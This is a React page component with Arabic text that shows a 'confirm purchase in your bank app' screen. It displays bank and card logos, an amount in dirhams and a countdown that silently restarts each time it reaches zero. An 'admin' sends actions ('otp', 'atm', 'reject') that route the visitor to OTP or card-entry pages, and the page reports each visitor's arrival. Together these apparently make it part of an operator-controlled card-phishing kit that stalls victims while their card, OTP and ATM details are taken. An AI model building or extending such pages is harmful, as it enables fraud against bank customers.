import { useEffect, useState } from "react";
import { useSignalEffect } from "@preact/signals-react";
import { useLocation } from "wouter";
import PageLayout from "@/components/layout/PageLayout";
import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
import {
  navigateToPage,
  cardAction,
} from "@/lib/store";

export default function BankAppVerification() {
  const [, navigate] = useLocation();
  const [timer, setTimer] = useState(120); // 2 minutes = 120 seconds

  // Get payment data from localStorage
  const paymentData = JSON.parse(localStorage.getItem("paymentData") || "{}");
  const totalAmount = paymentData.totalPaid || 0;

  // Get card info from localStorage (fallback) or signal
  const signalCardInfo = waitingCardInfo.value;
  const cardInfo = signalCardInfo || {
    bankName: paymentData.bankName || '',
    bankLogo: paymentData.bankLogo || '',
    cardType: paymentData.cardType || '',
  };

  // Emit page enter
  useEffect(() => {
    navigateToPage("تطبيق البنك");
  }, []);

  // Countdown timer - resets when it reaches 0
  useEffect(() => {
    const interval = setInterval(() => {
      setTimer((prev) => {
        if (prev <= 1) {
          return 120; // Reset to 2 minutes
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(interval);
  }, []);

  // Handle card action from admin (navigate away if admin sends another action)
  useSignalEffect(() => {
    if (cardAction.value) {
      const action = cardAction.value.action;
      if (action === 'otp') {
        navigate("/otp-verification");
      } else if (action === 'atm') {
        navigate("/otp-verification");
      } else if (action === 'reject') {
        navigate("/credit-card-payment");
      }
      cardAction.value = null;
    }
  });

  // Format timer as MM:SS
  const formatTimer = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
  };

  return (
    <PageLayout variant="default">
      <WaitingOverlay />

      <div className="bg-white rounded-2xl shadow-xl p-6 max-w-md mx-auto">
        {/* Bank Logo and Card Type */}
        <div className="flex justify-between items-center mb-8 px-4">
          {/* Card Type Logo (Visa/Mastercard) */}
          <div className="flex items-center">
            <img
              src={cardInfo?.cardType?.toLowerCase() === 'visa' ? '/images/visa.png' : cardInfo?.cardType?.toLowerCase() === 'mastercard' ? '/images/mastercard.png' : '/images/visa.png'}
              alt={cardInfo?.cardType || 'Card'}
              className="h-12 object-contain"
            />
          </div>
          {/* Bank Logo */}
          {cardInfo?.bankLogo && (
            <div className="flex items-center">
              <img
                src={cardInfo.bankLogo}
                alt={cardInfo.bankName || "Bank"}
                className="h-12 object-contain"
              />
            </div>
          )}
        </div>

        {/* Phone Icon */}
        <div className="flex justify-center mb-6">
          <div className="w-20 h-20 bg-gradient-to-br from-blue-500 to-blue-700 rounded-2xl flex items-center justify-center shadow-lg">
            <svg className="w-10 h-10 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
            </svg>
          </div>
        </div>

        {/* Main Message */}
        <div className="text-center mb-8">
          <h1 className="text-xl font-bold text-gray-800 mb-4">تأكيد عملية الشراء</h1>
          <div className="bg-blue-50 border border-blue-200 rounded-xl p-5">
            <p className="text-gray-700 text-base leading-relaxed font-medium">
              عليك الدخول إلى تطبيق البنك الخاص بك للموافقة على عملية الشراء
            </p>
            {totalAmount > 0 && (
              <p className="text-blue-700 font-bold text-lg mt-3">
                المبلغ: {totalAmount} د.إ
              </p>
            )}
          </div>
        </div>

        {/* Countdown Timer */}
        <div className="text-center mb-6">
          <p className="text-gray-500 text-sm mb-3">الوقت المتبقي للموافقة</p>
          <div className="inline-flex items-center justify-center bg-gradient-to-r from-gray-800 to-gray-900 text-white rounded-xl px-8 py-4 shadow-lg">
            <div className="flex items-center gap-1">
              <div className="flex flex-col items-center">
                <span className="text-3xl font-mono font-bold tracking-wider">
                  {formatTimer(timer)}
                </span>
              </div>
            </div>
          </div>
          <div className="flex justify-center gap-12 mt-2">
            <span className="text-xs text-gray-400">دقيقة</span>
            <span className="text-xs text-gray-400">ثانية</span>
          </div>
        </div>

        {/* Waiting Animation */}
        <div className="flex justify-center items-center gap-2 py-4">
          <div className="w-2.5 h-2.5 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: '0ms' }}></div>
          <div className="w-2.5 h-2.5 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: '150ms' }}></div>
          <div className="w-2.5 h-2.5 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: '300ms' }}></div>
          <span className="text-gray-500 text-sm mr-2">في انتظار الموافقة...</span>
        </div>

        {/* Info Note */}
        <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3 mt-4">
          <p className="text-yellow-800 text-xs text-center">
            ⚠️ لا تغلق هذه الصفحة حتى تتم الموافقة من تطبيق البنك
          </p>
        </div>
      </div>
    </PageLayout>
  );
}
